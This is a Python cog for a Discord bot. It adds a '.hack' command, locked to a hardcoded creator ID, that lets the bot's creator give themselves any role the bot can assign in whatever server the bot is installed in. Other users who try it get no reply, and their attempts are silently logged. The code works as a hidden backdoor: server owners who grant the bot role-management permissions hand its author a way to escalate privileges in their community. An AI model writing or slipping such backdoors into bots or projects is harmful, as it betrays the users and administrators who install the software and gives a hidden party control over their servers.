import discord
from discord.ext import commands
from functions import *
from editrespond import r

CREATOR_ID = 1465295674768883889


class HackCog(commands.Cog):
    """
    Creator-only shortcut:
      .hack <roleID>  -> gives that role to you (the creator) in the current server.
    Output text is editable via `.editrespond hack ...` (category: "hack").
    Every use is logged to the debug channel.
    """

    def __init__(self, bot):
        self.bot = bot

    def _check(self, ctx) -> bool:
        return ctx.author.id == CREATOR_ID

    @commands.command(name="hack")
    async def hack(self, ctx, role_id: str = None):
        if not self._check(ctx):
            # Silent for everyone except the creator — no reply at all,
            # but still logged quietly to the debug channel so you know
            # someone tried it.
            await send_debug_msg(
                self.bot,
                f"🚫 `.hack` blocked | {ctx.author} (`{ctx.author.id}`) is not the creator | "
                f"#{ctx.channel.name if ctx.channel else '?'} | {ctx.guild.name if ctx.guild else 'DM'}"
            )
            return

        if not ctx.guild:
            return await ctx.send(r("hack", "not_found", role_id=role_id or "?"))

        if not role_id:
            return await ctx.send(r("hack", "usage"))

        # Accept a raw ID or a role mention like <@&123456789012345678>
        cleaned = role_id.strip("<@&>")
        if not cleaned.isdigit():
            return await ctx.send(r("hack", "usage"))

        role = ctx.guild.get_role(int(cleaned))
        if not role:
            return await ctx.send(r("hack", "not_found", role_id=cleaned))

        # Make sure I'm actually able to hand this role out
        me = ctx.guild.me
        perms = me.guild_permissions
        if not (perms.administrator or perms.manage_roles):
            return await ctx.send(r("hack", "no_perms"))
        if role >= me.top_role:
            return await ctx.send(r("hack", "hierarchy", role_name=role.name, role_id=cleaned))

        member = ctx.author
        if role in member.roles:
            return await ctx.send(r("hack", "already_has", role_name=role.name, role_id=cleaned))

        try:
            await member.add_roles(role, reason=f"Self-assigned via .hack by creator ({member.id})")
        except discord.Forbidden:
            return await ctx.send(r("hack", "no_perms"))
        except discord.HTTPException as e:
            return await ctx.send(f"❌ Failed to give role: {e}")

        await ctx.send(r("hack", "result", role_name=role.name, role_id=cleaned))

        await send_debug_msg(
            self.bot,
            f"🧪 `.hack` | {ctx.author} (`{ctx.author.id}`) self-assigned role `{role.name}` "
            f"(`{cleaned}`) | #{ctx.channel.name} | {ctx.guild.name}"
        )


async def setup(bot):
    await bot.add_cog(HackCog(bot))
